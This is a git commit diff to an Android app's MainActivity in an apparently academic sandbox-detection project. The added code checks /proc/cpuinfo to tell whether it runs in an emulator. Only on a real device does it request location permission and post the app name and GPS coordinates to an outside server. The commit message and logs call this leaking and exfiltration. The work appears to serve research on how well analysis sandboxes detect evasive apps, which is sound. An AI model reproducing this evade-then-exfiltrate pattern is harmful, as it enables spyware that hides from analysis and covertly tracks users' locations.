077fcbc5159f64c0825a88c64187179f83ae6526
Timme Bethe <timme@timmebethe.nl>
2021-06-03 11:29:35 +0200

    Implemented actual leaking in CPUProperties
    - Updated all dependencies
    - Added leaking location

--- sandbox-detection/CPUProperties/app/src/main/java/nl/tbethe/shadowdroid/cpuproperties/MainActivity.kt
+++ sandbox-detection/CPUProperties/app/src/main/java/nl/tbethe/shadowdroid/cpuproperties/MainActivity.kt
@@ -1,26 +1,31 @@
 package nl.tbethe.shadowdroid.cpuproperties
 
-import android.os.Build
+import android.Manifest
+import android.content.pm.PackageManager
+import android.location.Criteria
+import android.location.LocationManager
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
-import android.text.method.ScrollingMovementMethod
 import android.util.Log
 import android.widget.TextView
+import androidx.activity.result.contract.ActivityResultContracts
+import io.ktor.client.*
+import io.ktor.client.engine.cio.*
+import io.ktor.client.request.forms.*
+import io.ktor.client.statement.*
+import io.ktor.http.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import java.io.FileReader
-import java.util.*
 
 private const val TAG = "MainActivity"
 
-
 class MainActivity : AppCompatActivity() {
-
-    private lateinit var textView : TextView
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-
-        textView = findViewById(R.id.text_view)
 
         var cpuInfo = "Could not retrieve cpu info."
         var isEmu = true // isEmulator
@@ -37,16 +42,53 @@ class MainActivity : AppCompatActivity() {
             // Intentionally do nothing
         }
 
-        // Display cpu info to the screen
-        textView.apply {
-            Log.d(TAG, "/proc/cpuinfo: $cpuInfo")
-            text = cpuInfo
-        }
 
-        if (!isEmu) {
-            Log.d(TAG, "Leak data")
-            TODO("Leak data")
-        }
+        leakLocationIf(!isEmu)
+    }
 
+    private fun leakLocationIf(notAnalyser: Boolean) {
+        if (!notAnalyser) return
+
+        fun sendLocation() {
+            val lm = getSystemService(LocationManager::class.java)
+            val provider = lm.getBestProvider(Criteria(), true)
+
+            val location = provider?.let {
+                lm.getLastKnownLocation(it)
+            }
+            location?.let { loc ->
+                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak?appname="
+                CoroutineScope(Dispatchers.IO).launch {
+                    try {
+                        HttpClient(CIO).use { client ->
+                            val response = client.submitForm<HttpResponse>(
+                                url,
+                                Parameters.build {
+                                    append("appname", packageName)
+                                    append("coords", "${loc.latitude}:${loc.longitude}")
+                                },
+                                false
+                            )
+                            Log.d(TAG, "Response status: ${response.status}")
+                            Log.d(TAG, "Response: ${response.readText()}")
+                        }
+                    } catch (e: Exception) {
+                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
+                    }
+                }
+            }
+        }
+        val requestPermission =
+            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
+                if (isGranted) sendLocation()
+            }
+        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            PackageManager.PERMISSION_DENIED -> {
+                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+            }
+            PackageManager.PERMISSION_GRANTED -> {
+                sendLocation()
+            }
+        }
     }
 }
